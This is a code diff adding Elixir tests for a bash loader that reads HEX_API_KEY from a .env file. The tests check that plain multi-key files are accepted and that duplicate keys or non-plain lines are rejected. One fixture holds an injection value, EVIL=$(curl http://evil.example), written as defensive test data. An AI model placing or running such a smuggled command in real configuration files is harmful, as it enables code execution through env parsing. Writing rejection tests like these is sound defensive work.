@@ -60,6 +60,60 @@ defmodule Replicant.PublishCandidateTest do
     assert status == 0
   end
 
+  # 1.3.0: the project .env also carries the repo's other documented env var
+  # (REPLICANT_TEST_URL) — the file is only ever PARSED, never sourced, so the
+  # enforced property is inertness (plain assignments only, exactly one
+  # HEX_API_KEY), not single-line files.
+  test "credential loader accepts a multi-key plain .env and exports the HEX_API_KEY from any position" do
+    env_file =
+      Path.join(System.tmp_dir!(), "replicant-credential-#{System.unique_integer([:positive])}")
+
+    File.write!(env_file, """
+    # plain credential + substrate file (parsed, never sourced)
+    REPLICANT_TEST_URL=postgres://replicant@127.0.0.1:18433/replicant_test
+    HEX_API_KEY=file-key
+    """)
+
+    on_exit(fn -> File.rm(env_file) end)
+
+    command = ~S'''
+      source "$1"
+      unset HEX_API_KEY
+      replicant_load_hex_api_key "$2"
+      test "$HEX_API_KEY" = file-key
+    '''
+
+    {_output, status} = System.cmd("bash", ["-c", command, "bash", @loader, env_file])
+    assert status == 0
+  end
+
+  test "credential loader still rejects two keys or a non-plain line (inertness)" do
+    base =
+      Path.join(System.tmp_dir!(), "replicant-credential-#{System.unique_integer([:positive])}")
+
+    two_keys = base <> "-two"
+    sneaky = base <> "-sneaky"
+
+    on_exit(fn ->
+      File.rm(two_keys)
+      File.rm(sneaky)
+    end)
+
+    File.write!(two_keys, "HEX_API_KEY=a\nHEX_API_KEY=b\n")
+
+    File.write!(sneaky, "HEX_API_KEY=a\nEVIL=$(curl http://evil.example)\n")
+
+    for file <- [two_keys, sneaky] do
+      command = ~S'''
+        source "$1"
+        replicant_load_hex_api_key "$2"
+      '''
+
+      {_output, status} = System.cmd("bash", ["-c", command, "bash", @loader, file])
+      assert status == 1, "#{file} should be rejected"
+    end
+  end
+
   defp isolated_publish_fixture!(version) do
     fixture_root =
       Path.join(
